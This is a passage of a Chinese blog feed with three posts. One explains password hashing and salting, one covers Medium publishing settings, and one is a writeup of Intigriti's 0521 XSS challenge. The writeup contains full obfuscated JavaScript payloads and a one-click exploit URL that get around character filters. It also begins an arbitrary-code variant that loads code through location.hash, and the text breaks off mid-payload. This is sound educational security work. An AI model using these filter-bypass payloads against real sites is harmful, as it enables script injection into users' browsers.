title="沒有人知道你的密碼，包括網站本身"></a>沒有人知道你的密碼，包括網站本身</h3><p>事實上，網站的資料庫是不會儲存你的密碼的。</p><p>或更精確地說，不會儲存你的「原始密碼」，但會儲存密碼經過某種運算後的結果，而且最重要的是，<strong>這個運算是無法還原的</strong>。</p><p>直接舉例比較快，假設今天有個很簡單的演算法，可以把密碼做轉換，轉換方式是：「數字不做轉換，英文字母把 a 換成 1，b 換成 2…z 換成 26」，以此類推，第幾個字母就換成幾，大小寫不分都一樣（先假設不會有符號）。</p><p>如果密碼是 abc123，轉換完就變成 123123。</p><p>在使用者註冊的時候，網站就把使用者輸入的 abc123 轉成 123123，然後存到資料庫裡面。因此資料庫存的密碼是 123123，而不是 abc123。</p><p>當使用者登入時，我們就再把輸入的值用同樣的邏輯轉換，如果輸入一樣，轉換後的結果就會一樣對吧？就知道密碼是不是正確的。</p><p>當駭客把資料庫偷走以後，會拿到 123123 這組密碼，那一樣啊，不是可以推論出原本是 abc123 嗎？不不不，沒這麼簡單。</p><p>123123、abcabc、12cab3…這些密碼轉換之後，不也是 123123 嗎？所以儘管知道轉換規則跟結果，卻沒有辦法還原成「唯一一組密碼」，這就是這個演算法厲害的地方！</p><p>這樣的轉換就叫做雜湊（Hash），abc123 每次 hash 過後的結果都會是 123123，但是從 123123 卻無法推回輸入一定是 abc123，因為有其他種可能性存在。</p><p>這就是 hash 跟加密最大的不同。</p><p>加密跟解密是成對的，如果可以加密就一定可以解密，所以你知道密文跟密鑰，就可以知道明文。但 hash 不同，你知道 hash 的演算法跟結果，卻無法回推出原本的輸入是什麼。</p><p>而這個機制最常見的應用之一，就在於密碼的儲存。</p><p>在註冊時把 hash 過後的密碼存進資料庫，登入時把輸入的密碼 hash 過後跟資料庫比對，就知道密碼是否正確。就算資料庫被偷，駭客也不知道使用者的密碼是什麼，因為回推不出來。</p><p>這就是為什麼忘記密碼的時候，網站不會跟你講原本的密碼是什麼，因為網站本身也不知道啊！</p><p>所以不能「找回密碼」，只能「重設密碼」，因為重設就代表你輸入新的密碼，然後網站把新的密碼 hash 之後存進資料庫，未來登入時就會用這組新的 hash 去比對。</p><p>有些人可能會注意到這樣的儲存方式似乎有個漏洞，延續前面的例子，資料庫存的是 123123 而我的原始密碼是 abc123，這樣如果用「abcabc」，hash 過後也是 123123，不就也可以登入嗎？這樣不太對吧，這不是我的密碼欸</p><p>有兩個不同的輸入卻產生出同一組輸出，這種狀況稱為碰撞（hash collision），碰撞一定會發生，但如果演算法設計的好，碰撞的機率就超級無敵小，小到幾乎可以忽略。</p><p>前面提的轉換規則只是為了方便舉例，真實世界中用的演算法複雜許多，就算只有一個字不同，結果都會天差地遠，以 SHA256 這個演算法為例：</p><ol><li>abc123 &#x3D;&gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090</li><li>abc124 &#x3D;&gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f</li></ol><p>類似的輸入卻產生截然不同的輸出。</p><p>像我前面舉例用的轉換就是不安全的 hash 演算法，要盡量避免使用或是避免自己設計，盡可能使用密碼學家跟專家設計出的演算法，像是上面提到的 SHA256。</p><p>在使用這些演算法的時候，也要特別注意一下是否安全，因為有些演算法雖然也是由專家設計，但已經被證明是不安全的，例如說密碼用 MD5 來 hash 後儲存就是不安全的，可以參考：<a href="https://security.stackexchange.com/questions/19906/is-md5-considered-insecure">Is MD5 considered insecure?</a></p><h3 id="所以，儲存-hash-後的值就沒事了嗎？"><a href="#所以，儲存-hash-後的值就沒事了嗎？" class="headerlink" title="所以，儲存 hash 後的值就沒事了嗎？"></a>所以，儲存 hash 後的值就沒事了嗎？</h3><p>抱歉，其實只儲存密碼 hash 過後的值是不夠的。</p><p>咦，為什麼？我剛剛不是說沒辦法反推出結果嗎，那為什麼不夠？</p><p>雖然說沒辦法反推出結果，但攻擊者可以利用「輸入一樣，輸出一定一樣」的特性，先建好一個資料庫。</p><p>舉例來說，假設有個很常見的密碼 abc123，hash 過後的值是 6ca13d，那攻擊者就可以先算好，然後把這個關係存在資料庫，所以攻擊者的資料庫裡面就可能會有一百萬組最常見密碼的清單，裡面有著每個密碼跟它 hash 過後的值。</p><p>那接下來只要在 hash 過後的資料庫發現 6ca13d，攻擊者就可以透過查表的方式，查出原本的密碼是 abc123。這不是利用演算法反推結果，這只是利用現有資料來查詢而已。</p><p>為了防禦這種攻擊，還要做一件事情叫做加鹽（Salting），沒錯，就是鹽巴的那個鹽。通常會幫每個使用者產生一個獨一無二的鹽巴，例如說 5ab3od（實際上會更長，可能 16 或 32 個字以上），接著把我的密碼 abc123 加上我的鹽巴，變成 abc1235ab3od，然後用這個加鹽過後的結果去做 hash。</p><p>為什麼要這樣做呢？</p><p>因為攻擊者預先準備好的表格中，比起 abc123，出現 abc1235ab3od 的機率顯然更低，同時又因為長度變長了，暴力破解的難度變得更高。如此一來，密碼就變得更難破解了。</p><p>更多資訊請參考：<a href="https://www.ithome.com.tw/voice/127918">不是祕密的祕密</a></p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>忘記密碼時網站不會把密碼寄給我，因為網站自己都不知道我的密碼是什麼。雖然聽起來不太可能，但實際狀況就是如此。為了安全性，這是必須的手段。</p><p>要達成這樣的目的，背後最重要的技術原理就是 hash，「同樣的密碼會產生同樣的 hash 值，但從 hash 值沒辦法對應回原本的密碼」就是秘訣所在。</p><p>反之，如果你發現有網站可以找回你的密碼，那就得要多加注意，有可能網站資料庫存的不是 hash 值而是你的密碼。在這種狀況下，萬一有天資料庫被入侵，帳密被偷走，駭客就能得知你真實的密碼，然後去試其他的服務。</p><p>有關於密碼管理，現在瀏覽器也有功能可以自動幫你產生密碼外加記憶密碼，或也可以使用現成的密碼管理軟體，都可以在不同網站產生不同的密碼。</p><p>這篇希望能讓對這個領域陌生的讀者們也能知道一些基本的概念，包括：</p><ol><li>有些網站比你想得脆弱很多，改個網址就可以拿到別人的資料</li><li>對於安全性做得不好的網站，拿到整個資料庫不是一件難事</li><li>忘記密碼只能重設，不能找回，是因為網站也不知道你的密碼</li><li>如果有網站可以把舊密碼給你，那你得要小心一點</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>簡單介紹發布 Medium 文章前可以改的東西</title>
      <link href="/2021/06/25/update-settings-before-publish-on-medium-d2993706a9b0/"/>
      <url>/2021/06/25/update-settings-before-publish-on-medium-d2993706a9b0/</url>
      
        <content type="html"><![CDATA[<p>這篇簡單寫一下發表文章前我會設定的東西，大部分選項都藏在右上角那三個點裡面，點下去你會看到一堆可以設置的選項：</p><p><img src="/img/update-settings-before-publish-on-medium-d2993706a9b0/1__3__TZk8vXTdTWS8tZArhOYA.png"></p><p>底下條列式來介紹一下我自己會使用的選項，沒用到的我就不介紹了：</p><ol><li>Add to publication：如果要發表在 publication 記得點這個，沒點的話就會發在個人帳號底下</li><li>Share draft link：當你寫完文章還不想發表，想先給其他人看時就點這個，可以拿到草稿連結，需要登入才能觀看。文章發表後草稿連結跟正式連結會是一樣的，十分方便</li><li>Change featured image：更改主題圖片，這會影響到在有 preview 功能的網站會看到哪張圖，例如說在 Facebook 分享時就會出現這邊設定的圖</li><li>Change display title &#x2F; subtitle：就更改標題跟副標題，沒改的話就是自動抓的，可以視情況調整</li><li>Change tags：改標籤，沒設的話就是沒有，最多只能五個，可以視情況加一下，標籤支援中文（但比較少標籤）</li><li>More settings：點下去會看到更多選項，但有部分會跟這邊重複</li></ol><p>上面這幾個就圖片跟標題都可以調整，tag 看要不要加，然後草稿連結滿好用的。</p><p>更多選項點進去之後會看到滿多與這邊相同的功能，但我通常會設定的只有點進去以後最下方的 Advanced Settings 點開之後的選項：</p><p><img src="/img/update-settings-before-publish-on-medium-d2993706a9b0/1__4pIUloFlUUOsZ36SQMiu0Q.png"></p><p>Story link 就是網址，預設會是標題做成的，這有專有名詞叫做 slug（我在上一間公司學到的）。</p><p>如果你的標題是中文，我強烈建議點選 custom 然後自己改成英文，因為中文網址很長又沒辦法閱讀，改成英文簡潔方便，我每一篇文章都會手動改成英文。</p><p>最下面的 Customize Canonical Link 可以指定這文章是不是有發佈在其他地方，這對 SEO 會有影響，Google 會把指過去的文章視為主要的版本，詳情可參考：<a href="https://developers.google.com/search/docs/advanced/crawling/consolidate-duplicate-urls?hl=zh-tw">https://developers.google.com/search/docs/advanced/crawling/consolidate-duplicate-urls?hl=zh-tw</a></p><p>如果你有用一些轉換文章格式的服務，例如說把 markdown 轉換成 gist 再匯入過來，那這邊就會自動填入，記得把它取消選取，否則流量會到 gist 那邊去。</p><p>我自己通常標題跟副標題其實不會動，圖片也比較不會，標籤有時候也懶得加，但一定會改的就是網址，把預設的中文網址改成英文，看起來通體舒暢，推薦給大家。</p><p>其他我會注意的事情是有沒有按照<a href="https://github.com/sparanoid/chinese-copywriting-guidelines">中文排版指北</a>來排版，最常見的像是：</p><ol><li>中英之間要空格，跟數字之間也要空格</li><li>專有名詞是否使用正確，例如說 GitHub 而不是 Github</li><li>使用全形標點符號</li></ol>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</title>
      <link href="/2021/06/07/intigritis-0521-xss-challenge-writeup-b859a65acc48/"/>
      <url>/2021/06/07/intigritis-0521-xss-challenge-writeup-b859a65acc48/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.intigriti.com/">Intigriti</a> 是國外的一個 bug bounty 平台，每個月都會推出一個 XSS 挑戰，有大約一到兩週的時間可以去思考，目標是在特定網站上面執行 <code>alert(document.domain)</code> ，解出來之後把結果透過 Intigriti 平台回報，最後會隨機抽 3 個解掉的人得到他們自己商店的優惠券。</p><p>上個月的挑戰因為解出來的人不多，所以我有幸運抽到 50 歐元的優惠券，其實很划算，因為商店賣的東西其實都滿便宜的，我買了一件 t-shirt + 兩頂帽子再加國際運費，大概 45 歐元左右。</p><p>不過這種獎品就是靠運氣啦，還是解題好玩比較重要。</p><p>挑戰網址在這邊： <a href="https://challenge-0521.intigriti.io/">https://challenge-0521.intigriti.io/</a></p><p><img src="/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__PWzGDbO1b8eyAan5.png"></p><h3 id="程式碼分析"><a href="#程式碼分析" class="headerlink" title="程式碼分析"></a>程式碼分析</h3><p>解題的第一步就是分析一下它的程式碼，先了解一下這整個題目的運作為何。首頁這一頁看起來沒什麼東西，比較值得注意的只有一個網址是 <code>./captcha.php</code> 的 iframe，直接來看看裡面是什麼：</p><p>這邊有幾個 input，然後使用者按下送出時會把輸入的 c.value 丟到 eval 去執行，但有限定字元，不能使用： <code>a-df-z&lt;&gt;()!\=&#39;&quot;</code> ，在英文字母裡面只有 e 是可以用的。</p><p>因此這題的目標就很明顯了，是要繞過這個字元的限制，然後透過那個 eval 幫我們執行 <code>alert(document.domain)</code></p><h3 id="全面啟動"><a href="#全面啟動" class="headerlink" title="全面啟動"></a>全面啟動</h3><p>有關繞過字元限制，之前我有寫了一篇： <a href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a> ，沒想到這次就派上用場了。</p><p>舉例來說， <code>0/0</code> 可以產生 <code>NaN</code>，所以 <code> `$&#123;0/0&#125;`[1]</code> 就可以拿到字元 a。只要用類似的技巧，應該就可以產生出我們想要的所有字元。</p><p>但這題難的地方我覺得不在這，而是一開始在思考這題的時候腦袋容易打結，因為會分不太清楚什麼程式碼會直接被執行，什麼程式碼又不會。</p><p>舉例來說，就算費盡千辛萬苦拼出了目標字串好了，丟到 eval 去之後其實結果跟你想像中不太一樣，因為結構大概會像這樣： <code>eval(&#39;&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1)&quot;&#39;)</code></p><p>最後的結果會是字串： <code>alert(1)</code> ，而不是直接執行 alert(1)，因為你在做的只是把想執行的程式碼拼出來，而 eval 只是幫你拼起來而已。那如果再把 eval 拼出來呢？</p><p><code>eval(&#39;&quot;eval(a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;+&quot;(1))&quot;&#39;</code></p><p>這樣也是沒用的，也只會出現字串的 eval 而已。之所以這樣不行，是因為你拼的東西是字串中的字串。舉例來說，請看下面這兩段程式碼：</p><pre><code>eval(&#39;alert(1)&#39;)</code></pre><p>前者會跳出 alert，後者會輸出字串 alert。這就是因為後者是：「字串中的字串」。如果用字串拼接的方式，就一定會這樣。</p><p>所以如果需要執行程式碼的話，我們一定要有一些東西是不需要拼接的，在 JS 裡面可以把字串當作程式碼執行的有：</p><ol><li>eval</li><li>function constructor</li><li>setTimeout</li><li>setInterval</li><li>location</li></ol><p>這裡面符合我們需求的，就是 function constructor 了！</p><p>為什麼這樣說呢？因為我們可以不直接透過字串存取到這個東西！先簡單講一下 function constructor，就是 <code>Function()</code> 這個東西，可以動態產生函式。</p><p>然後 <code>Function</code> 就是 <code>Function.prototype.constructor</code>，所以可以利用 prototype chain 加上陣列來存取到：</p><p><code>[][&#39;constructor&#39;][&#39;constructor&#39;] === Function // true</code></p><p>有了這個之後，就可以動態建立 function 並且執行了！</p><p>像這樣：<code>[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</code></p><p>那為什麼這樣子放進 eval 之後就可以呢？因為 <code>[]</code> 並不是用字串組成的，所以放進 eval 會是這樣： <code>eval(&quot;[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()&quot;)</code></p><p>這樣一來，就可以在 eval 裡面透過 function constructor 去動態執行程式碼了，這就是這個章節的標題「全面啟動」的意思，一層還有一層。</p><p>不過除了要找出替代字串以外，還有一個問題，那就是函式呼叫不能使用 <code>()</code> ，這該怎麼辦呢？</p><h3 id="Tagged-templates"><a href="#Tagged-templates" class="headerlink" title="Tagged templates"></a>Tagged templates</h3><p>有用過 React 中的 styled components 的話，對這個語法應該不陌生：</p><p>const Box &#x3D; styled.div`<br>  background: red;<br>`</p><p>其實 <code>styled.div</code> 是一個 function，然後用反引號來呼叫 function。沒錯，反引號也是可以呼叫函式的，但要注意的是參數的傳遞會跟你想的不太一樣。</p><p>直接做個簡單示範就知道了：</p><p>用反引號來呼叫函式的話，第一個參數會是一個陣列，裡面是所有一般的字串，隔開的標準是中間有 <code>$&#123;&#125;</code>，而接下來第二個參數以後都是你放在 <code>$&#123;&#125;</code> 裡的內容。</p><p>更多範例可參考：<a href="https://pjchender.blogspot.com/2017/01/javascript-es6-template-literalstagged.html">[筆記] JavaScript ES6 中的模版字符串（template literals）和標籤模版（tagged template）</a></p><p>把我們上面的程式碼用反引號改寫會變這樣：</p><p>[][‘constructor’][‘constructor’]`${‘alert(1)’}```</p><p>但這樣的話如果你丟去執行，會發現有錯。因為根據我們上面所說的，這樣寫的話傳去 function constructor 的參數會是：<code>[&quot;&quot;], &#39;alert(1)&#39;</code> ，第一個參數是一個含有空字串的陣列。</p><p>而 function constructor 除了最後一個參數之外，其他都會被當作要動態新增的函式的參數，例如說 <code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a+b&#39;)</code> 就是：</p><p>function (a, b) {<br>  return a+b<br>}</p><p>所以第一個參數給空字串是行不通的，加一個變數就行了，例如說題目允許的 e 或者是 _：</p><p>[][‘constructor’][‘constructor’]`_${‘alert(1)’}``｀  </p><p>&#x2F;&#x2F; 產生出的函式<br>function anonymous(_,) {<br>  alert(1)<br>}</p><p>這樣就能順利執行程式碼了，因此最後剩下的就只有拼出 <code>constructor</code> 跟 <code>alert(document.domain)</code> 了</p><h3 id="字串拼拼樂"><a href="#字串拼拼樂" class="headerlink" title="字串拼拼樂"></a>字串拼拼樂</h3><p>除了我開頭提到的文章： <a href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a>之外， <a href="https://github.com/aemkei/jsfuck/blob/master/jsfuck.js">jsfuck</a> 的程式碼也有很多可以參考的地方。</p><p>底下是我用的幾個：</p><p>1. `${``+{}}` &#x3D;&gt; “[object Object]“<br>2. `${``[0]}` &#x3D;&gt; “undefined”<br>3. `${e}` &#x3D;&gt; “[object HTMLProgressElement]“<br>4. `${0&#x2F;0}` &#x3D;&gt; “NaN”</p><p>我們可以從上面這些組合中，找到所有需要的字元。接下來只差最後兩個了，就是 <code>()</code> ，我們必須也用拼的拼出這兩個字元才行。</p><p>這要怎麼拿到呢？在 JS 裡面把 function 變成字串的話，就會是整個 function 的內容，像這樣：</p><p>`${[][‘constructor’]}`<br>=&gt; “function Array() { [native code] }”</p><p>可以透過這樣子拿到這裡面的 <code>()</code> 這兩個字元。</p><p>結合以上的技巧，我自己寫了一個簡單的小程式去產出最終的結果：</p><p>output(長度 851):</p><p>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`${0&#x2F;0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${``+{}}`[6]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${``[0]}`[2]+`${``+{}}`[1]+`${``+{}}`[5]+`${``[0]}`[0]+`${e}`[23]+`e`+`${``[0]}`[1]+`${``+{}}`[6]+`.`+`${``[0]}`[2]+`${``+{}}`[1]+`${e}`[23]+`${0&#x2F;0}`[1]+`${``[0]}`[5]+`${``[0]}`[1]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</p><p>把上面這整串貼到網頁上的 input 然後按下提交，就會看到 alert 跳出來囉！</p><p><img src="/img/intigritis-0521-xss-challenge-writeup-b859a65acc48/0__ztgfHdjYQDJnAxUK.png"></p><p>做到這邊之後我就很開心地去送答案，結果得到了一個回覆，跟我說這是 self-XSS，提示我說可以多往 php 那邊去研究一點。</p><p>沒錯，我都忘記這是一個 self-XSS 了，因為需要自己把這串 payload 貼在 input 上面送出，就有點像是使用者必須自己把惡意程式碼貼過來一樣，這種通常沒辦法構成具有嚴重性的漏洞。</p><p>因此我就往 PHP 那邊去看，隨便試了一下發現 <code>c=xxx</code> 的內容會直接反映在 c.value 上，所以只要把上面那一串放到網址上面去就好了，變成：</p><p><a href="https://challenge-0521.intigriti.io/captcha.php?c=%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%60_$%7B%60$%7B0/0%7D%60%5B1%5D+%60$%7Be%7D%60%5B21%5D+%60e%60+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%7D%60%5B14%5D+%60$%7B%60%60%5B0%5D%7D%60%5B2%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7Be%7D%60%5B23%5D+%60e%60+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60.%60+%60$%7B%60%60%5B0%5D%7D%60%5B2%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B23%5D+%60$%7B0/0%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B5%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7B%5B%5D%5B%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7B%60%60%5B0%5D%7D%60%5B1%5D+%60$%7Be%7D%60%5B18%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7Be%7D%60%5B13%5D+%60$%7B%60%60%5B0%5D%7D%60%5B0%5D+%60$%7B%60%60+%7B%7D%7D%60%5B5%5D+%60$%7B%60%60+%7B%7D%7D%60%5B6%5D+%60$%7B%60%60+%7B%7D%7D%60%5B1%5D+%60$%7Be%7D%60%5B13%5D%5D%7D%60%5B15%5D%7D%60%60+%60">https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`${0&#x2F;0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${``%2b{}}`[6]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${``[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${``[0]}`[1]%2b`${``%2b{}}`[6]%2b`.`%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${e}`[23]%2b`${0&#x2F;0}`[1]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}```</a></p><p>這樣子使用者點了網址之後 payload 就會自動填好，只要按按鈕就可以觸發。於是我們把 self-XSS 變成了 one-click XSS，點個按鈕就會中招。</p><p>做到這邊其實就通過這題了，但因為還有時間，所以我還想再研究更多東西。</p><h3 id="執行任意程式碼"><a href="#執行任意程式碼" class="headerlink" title="執行任意程式碼"></a>執行任意程式碼</h3><p>只是執行固定的程式碼不太好玩，有沒有可能執行任意程式碼？像是這種任意程式碼執行通常都會透過幾個方法把程式碼帶進去，例如說：</p><ol><li>window.name</li><li>iframe + top.name</li><li>location.hash</li></ol><p>這邊前兩者都需要自己再做另一個網頁，只有 location.hash 不需要，因此這邊就先以這個作法為主吧！</p><p>我們需要湊出的字串是：</p><p>[][‘constructor’][‘constructor’]`_${‘eval(location.hash.slice(1))’}```</p><p>這樣只要讓網址最後面是：<code>#alert(document.domain)</code> ，就可以達成一樣的效果了。</p><p>新的字元組合，缺少的只有兩個：v 跟 h。</p><p>這兩個其實不太好找，因為比較好找的已經都被我們找完了。那還有哪裡可以找呢？</p><p>首先是 v 的部分，其實可以把原生的 function 變成 string，就能拿到 <code>[native code]</code> 這個字串。但是在 Chrome 上與 Firefox 上的輸出不太一樣，以 RegExp 為例，</p><p>Chrome 的輸出是： <code>function RegExp() &#123; [native code] &#125;</code><br>Firefox 的輸出是： <code>function RegExp() &#123;\n [native code]\n&#125;</code></p><p>Firefox 的輸出會換行而 Chrome 不會，這就造成了字元 index 的差異，所以沒辦法跨瀏覽器取得 v 這個字。不過我們先不管這個，先來看 h 好了。</p><p>h 一樣也是不容易取得，但如果我們能組出： <code>17[&#39;toString&#39;]`36` </code> ，其實就能拿到 h。</p><p>因為上面的程式碼就是把 17 這個數字轉成 36 進位，這樣就可以拿到 h，因為 h 是第 8 個英文字母（9 個數字 + 第 8 個英文字母 &#x3D; 17）。</p><p>那這個大寫的 S 怎麼拿呢？String constructor 可以拿到：</p><p>``[‘constructor’] + ‘’<br>&#x2F;&#x2F; output<br>&#x2F;&#x2F; “function String() { [native code] }”</p><p>而且一旦我們可以用 toString 的這個技巧，其實任何小寫英文字母都可以拿到了，當然也包含前面所說的 v。</p><p>詳細過程我就不示範了，把程式改一下就好，最後的結果是（1925 個字）：</p><p>[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`e`+31[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0&#x2F;0}`[1]+`${e}`[21]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${e}`[21]+`${``+{}}`[1]+`${``+{}}`[5]+`${0&#x2F;0}`[1]+`${``+{}}`[6]+`${``[0]}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`.`+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0&#x2F;0}`[1]+`${e}`[18]+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`.`+`${e}`[18]+`${e}`[21]+`${``[0]}`[5]+`${``+{}}`[5]+`e`+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+1+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1